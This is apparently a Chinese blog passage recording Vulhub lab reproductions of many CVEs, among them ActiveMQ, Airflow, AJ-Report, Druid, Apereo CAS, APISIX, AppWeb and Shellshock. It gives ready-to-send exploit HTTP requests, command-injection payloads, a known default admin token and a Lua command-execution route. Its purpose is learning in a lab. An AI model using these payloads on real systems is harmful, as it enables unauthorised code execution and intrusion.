class="language-none">&gt;python poc.py -u admin -p admin http://your-ip:8161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/8.jpg" alt="8"></p><blockquote><p>Webshell被写入在<code>/admin/shell.jsp</code>文件中：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/9.jpg" alt="9"></p><blockquote><p>这个方法受到ActiveMQ版本的限制，因为Log4j2是在5.17.0中才引入Apache ActiveMQ。</p></blockquote><h1 id="Apache-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）"><a href="#Apache-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）" class="headerlink" title="Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）"></a>Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）</h1><blockquote><p>Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>OpenWire协议在ActiveMQ中被用于多语言客户端与服务端通信。在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://activemq.apache.org/news/cve-2023-46604">https://activemq.apache.org/news/cve-2023-46604</a></li><li><a href="https://xz.aliyun.com/t/12929">https://xz.aliyun.com/t/12929</a></li><li><a href="https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/">https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/</a></li><li><a href="https://forum.butian.net/share/2566">https://forum.butian.net/share/2566</a></li></ul></blockquote><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，启动一个HTTP反连服务器，其中包含我们的<a href="poc.xml">poc.xml</a>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 -m http.server 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，执行<a href="poc.py">poc.py</a>，传入的三个参数分别是目标服务器地址、端口，以及包含poc.xml的反连平台URL：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 poc.py target port http://ip of http server/poc.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行完成后，进入ActiveMQ容器：</p><pre class="line-numbers language-none"><code class="language-none">docker exec cve-2023-46604-activemq-1 ls -l /tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/11.jpg" alt="11"><br>使用python开启http反连服务器时,目录即为命令行的开启目录<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/12.jpg" alt="12"></p><blockquote><p>可见，<code>touch /tmp/activeMQ-RCE-success</code>已经被成功执行：</p></blockquote><h1 id="Adminer-ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）"><a href="#Adminer-ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）" class="headerlink" title="Adminer ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）"></a>Adminer ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）</h1><blockquote><p>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</p><p>在其4.0.0到4.7.9版本之间，连接 ElasticSearch 和 ClickHouse 数据库时存在一处服务端请求伪造漏洞（SSRF）。</p><p>参考连接：</p><ul><li><a href="https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6">https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6</a></li><li><a href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml</a></li></ul></blockquote><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在Adminer登录页面，选择ElasticSearch作为系统目标，并在server字段填写<code>example.com</code>，点击登录即可看到<code>example.com</code>返回的400错误页面展示在页面中：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/13.jpg" alt="13"></p><h1 id="Adminer远程文件读取（CVE-2021-43008）"><a href="#Adminer远程文件读取（CVE-2021-43008）" class="headerlink" title="Adminer远程文件读取（CVE-2021-43008）"></a>Adminer远程文件读取（CVE-2021-43008）</h1><blockquote><p>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</p><p>在其版本1.12.0到4.6.2之间存在一处因为MySQL LOAD DATA LOCAL导致的文件读取漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/p0dalirius/CVE-2021-43008-AdminerRead">https://github.com/p0dalirius/CVE-2021-43008-AdminerRead</a></li><li><a href="http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></li></ul></blockquote><h2 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>使用<a href="https://github.com/4ra1n/mysql-fake-server">mysql-fake-server</a>启动一个恶意的MySQL服务器。在Adminer登录页面中填写恶意服务地址和用户名<code>fileread_/etc/passwd</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/15.jpg" alt="15"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/16.jpg" alt="16"></p><blockquote><p>可见，我们已经收到客户端连接，读取到的文件<code>/etc/passwd</code>已保存至当前目录：</p></blockquote><p>我这里怎么试都没法返回passwd文件…无奈放弃了<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/17.jpg" alt="17"><br>看起来多半是文件为空导致无法返回 怪欸</p><h1 id="Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）"><a href="#Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）" class="headerlink" title="Apache Airflow 示例dag中的命令注入（CVE-2020-11978）"></a>Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</h1><blockquote><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p><p>由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。</p><p>参考链接：</p><ul><li><a href="https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx">https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx</a></li><li><a href="https://github.com/pberba/CVE-2020-11978">https://github.com/pberba/CVE-2020-11978</a></li></ul></blockquote><h2 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>访问<code>http://your-ip:8080</code>进入airflow管理端，将<code>example_trigger_target_dag</code>前面的Off改为On：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/18.jpg" alt="18"></p><blockquote><p>再点击执行按钮，在Configuration JSON中输入：<code>{"message":"'\";touch /tmp/airflow_dag_success;#"}</code>，再点<code>Trigger</code>执行dag：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/19.jpg" alt="19"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/20.jpg" alt="20"></p><blockquote><p>等几秒可以看到执行成功：<br>到CeleryWorker容器中进行查看：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/21.jpg" alt="21"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/22.jpg" alt="22"></p><p>可以看到成功创建了airflow_dag_success</p><h1 id="Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）"><a href="#Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）" class="headerlink" title="Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）"></a>Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</h1><blockquote><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis/RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。</p><p>由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。</p><p>参考链接：</p><ul><li><a href="https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx">https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx</a></li><li><a href="https://github.com/apache/airflow/pull/9178">https://github.com/apache/airflow/pull/9178</a></li></ul></blockquote><h2 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 利用这个漏洞需要控制消息中间件，Vulhub环境中Redis存在未授权访问。通过未授权访问，攻击者可以下发自带的任务<code>airflow.executors.celery_executor.execute_command</code>来执行任意命令，参数为命令执行中所需要的数组。<br> 我们可以使用<a href="exploit_airflow_celery.py">exploit_airflow_celery.py</a>这个小脚本来执行命令<code>touch /tmp/airflow_celery_success</code>：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip install redispython exploit_airflow_celery.py [your-ip]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/23.jpg" alt="23"></p><blockquote><p>查看结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker compose logs airflow-worker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到如下任务消息：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/24.jpg" alt="24"></p><blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt;docker compose exec airflow-worker ls -l /tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到成功创建了文件<code>airflow_celery_success</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/25.jpg" alt="25"></p><h1 id="AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h1><blockquote><p>AJ-Report是全开源的一个BI平台。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://xz.aliyun.com/t/14460">https://xz.aliyun.com/t/14460</a></li><li><a href="https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md">https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md</a></li></ul></blockquote><h2 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>要利用该漏洞，只需要发送如下数据包：</p><pre class="line-numbers language-none"><code class="language-none">POST /dataSetParam/verification;swagger-ui/ HTTP/1.1Host: your-ip:9095User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Content-Type: application/json;charset=UTF-8Connection: closeContent-Length: 339{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/26.jpg" alt="26"><br>可见，<code>id</code>命令已经执行成功：</p><h1 id="Apache-Druid-代码执行漏洞（CVE-2021-25646）"><a href="#Apache-Druid-代码执行漏洞（CVE-2021-25646）" class="headerlink" title="Apache Druid 代码执行漏洞（CVE-2021-25646）"></a>Apache Druid 代码执行漏洞（CVE-2021-25646）</h1><blockquote><p>Apache Druid是一个开源的分布式数据存储。</p><p>Apache Druid包括执行嵌入在各种类型请求中的用户提供的JavaScript代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在Druid 0.20.0及以前的版本中，攻击者可以通过发送一个恶意请求使Druid用内置引擎执行任意JavaScript代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution">https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution</a></li><li><a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw</a></li></ul></blockquote><h2 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>直接发送如下请求即可执行其中的JavaScript代码：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">POST /druid/indexer/v1/sampler HTTP/1.1Host: your-ip:8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/json{    "type":"index",    "spec":{        "ioConfig":{            "type":"index",            "firehose":{                "type":"local",                "baseDir":"/etc",                "filter":"passwd"            }        },        "dataSchema":{            "dataSource":"test",            "parser":{                "parseSpec":{                "format":"javascript",                "timestampSpec":{                },                "dimensionsSpec":{                },                "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",                "":{                    "enabled":"true"                }                }            }        }    },    "samplerConfig":{        "numRows":10    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/27.jpg" alt="27"><br>可见，<code>id</code>命令已被成功执行：</p><h1 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h1><blockquote><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://apereo.github.io/2016/04/08/commonsvulndisc/">https://apereo.github.io/2016/04/08/commonsvulndisc/</a></li></ul></blockquote><h2 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class EncryptedTranscoder implements Transcoder {    private CipherBean cipherBean;    private boolean compression = true;    public EncryptedTranscoder() throws IOException {        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());        bufferedBlockCipherBean.setKeyAlias("aes128");        bufferedBlockCipherBean.setKeyPassword("changeit");        bufferedBlockCipherBean.setNonce(new RBGNonce());        this.setCipherBean(bufferedBlockCipherBean);    }    // ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><pre class="line-numbers language-none"><code class="language-none">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/28.jpg" alt="28"></p><blockquote><p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><pre class="line-numbers language-none"><code class="language-none">POST /cas/login HTTP/1.1Host: your-ipContent-Length: 2287Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://your-ip:8080Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://your-ip:8080/cas/loginAccept-Encoding: gzip, deflateAccept-Language: en,zh-CN;q=0.9,zh;q=0.8Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734Connection: closeusername=test&amp;password=test&amp;lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution=[payload]&amp;_eventId=submit&amp;submit=LOGIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/29.jpg" alt="29"></p><blockquote><p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/30.jpg" alt="30"></p><h1 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h1><blockquote><p>Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行。</p><p>参考链接：</p><ul><li><a href="https://apisix.apache.org/docs/apisix/getting-started">https://apisix.apache.org/docs/apisix/getting-started</a></li><li><a href="https://github.com/apache/apisix/pull/2244">https://github.com/apache/apisix/pull/2244</a></li><li><a href="https://seclists.org/oss-sec/2020/q4/187">https://seclists.org/oss-sec/2020/q4/187</a></li></ul></blockquote><h2 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用默认Token增加一个恶意的router，其中包含恶意LUA脚本：</p><pre class="line-numbers language-none"><code class="language-none">POST /apisix/admin/routes HTTP/1.1Host: your-ip:9080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeX-API-KEY: edd1c9f034335f136f87ad84b625c8f1Content-Type: application/jsonContent-Length: 406{    "uri": "/attack","script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",    "upstream": {        "type": "roundrobin",        "nodes": {            "example.com:80": 1        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/31.jpg" alt="31"></p><blockquote><p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">http://your-ip:9080/attack?cmd=id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/32.jpg" alt="32"></p><h1 id="Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成"><a href="#Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成" class="headerlink" title="Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)"></a>Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)</h1><blockquote><p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p><p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p><p>参考链接：</p><ul><li><a href="https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/">https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/</a></li><li><a href="https://github.com/wuppp/cve-2021-45232-exp">https://github.com/wuppp/cve-2021-45232-exp</a></li></ul></blockquote><h2 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先用默认账号密码admin/vulhub来登录网站<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/33.jpg" alt="33"><br>注:默认账号密码可能会因为镜像版本不同而有变化 具体还请查看容器目录下的comfig.yaml</p><p>登陆完之后进入路由页面 新建一个路由<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/34.jpg" alt="34"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/35.jpg" alt="35"><br>至于相关设置直接随意 快速下一步到创建就行了<br>在访问了网站的<code>/apisix/admin/migrate/export</code>目录后获取了一个bak文件 查看后可以发现我们刚刚配置的路由信息被泄露了<img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/36.jpg" alt="36"><br>剩下的过程不好复现 先暂且跳过</p><h1 id="AppWeb认证绕过漏洞（CVE-2018-8715"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715)"></a>AppWeb认证绕过漏洞（CVE-2018-8715)</h1><blockquote><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><p>参考链接：</p><ul><li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li></ul></blockquote><h2 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p><p>构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p><pre class="line-numbers language-none"><code class="language-none">GET / HTTP/1.1Host: example.comAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeAuthorization: Digest username=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/37.jpg" alt="37"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/38.jpg" alt="38"></p><blockquote><p>设置这个session到浏览器，即可正常访问需要认证的页面：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/39.jpg" alt="39"></p><h1 id="Aria2-任意文件写入漏洞-（未完成）"><a href="#Aria2-任意文件写入漏洞-（未完成）" class="headerlink" title="Aria2 任意文件写入漏洞 （未完成）"></a>Aria2 任意文件写入漏洞 （未完成）</h1><blockquote><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p><p>参考文章：[<a href="https://paper.seebug.org/120/][1]">https://paper.seebug.org/120/][1]</a></p></blockquote><h2 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/">http://binux.github.io/yaaw/demo/</a> 。</p><p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<code>http://your-ip:6800/jsonrpc</code></p></blockquote><p>这个多半需要公网环境… 回去再搞</p><h1 id="Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）"><a href="#Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）" class="headerlink" title="Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）"></a>Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）</h1><blockquote><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><p>将payload附在User-Agent中访问victim.cgi：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令成功被执行：</p></blockquote><p>不知道为啥就是没有正常回显…</p><h1 id="Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)</h1><blockquote><p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf">https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf</a></li><li><a 